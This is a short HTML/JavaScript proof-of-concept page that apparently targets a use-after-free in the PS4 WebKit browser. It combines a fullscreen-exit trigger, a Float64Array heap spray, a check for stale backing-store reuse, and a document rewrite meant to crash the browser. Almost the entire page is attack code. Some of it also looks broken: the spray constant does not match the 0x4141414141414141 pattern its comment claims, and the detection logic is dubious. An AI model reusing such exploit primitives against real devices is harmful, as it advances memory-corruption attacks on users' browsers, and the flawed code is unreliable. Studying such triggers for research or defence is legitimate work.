<!DOCTYPE html>
<html>
<meta charset="utf-8">
<title>PS4 WebKit UAF – Order Validation</title>

<body>
<button onclick="run()">Run UAF Order Test</button>
<pre id="log"></pre>

<script>
function log(s) {
    document.getElementById("log").textContent += s + "\n";
}

function run() {
    log("[*] Initializing objects");

    let victims = [];
    for (let i = 0; i < 4096; i++) {
        let f = new Float64Array(8);
        f[0] = i + 0.123;
        victims.push(f);
    }

    document.documentElement.webkitRequestFullscreen();
    log("[*] Fullscreen requested – press OPTIONS");

    window.onblur = () => {
        log("[*] onblur triggered (fullscreen exit)");

        // Heap reuse spray
        let spray = [];
        const PATTERN = 2.121995791e-314; // 0x4141414141414141
        for (let i = 0; i < 6000; i++) {
            let s = new Float64Array(8);
            s.fill(PATTERN);
            spray.push(s);
        }

        log("[*] Spray complete");

        // Detect stale backing store reuse
        let hit = -1;
        for (let i = 0; i < victims.length; i++) {
            if (victims[i][0] === PATTERN) {
                hit = i;
                break;
            }
        }

        if (hit === -1) {
            log("[-] No corruption detected this run");
            return;
        }

        log("[+] UAF CONFIRMED at victims[" + hit + "]");

        // ---- CONTROL POINT ----
        // Comment this line to allow crash
        // victims[hit].fill(0);

        log("[*] Triggering document rewrite");

        document.open();
        document.write("<h1>Rebuild</h1>");
        document.close();

        log("[*] If browser crashes now → UAF path confirmed");
    };
}
</script>
</body>
</html>
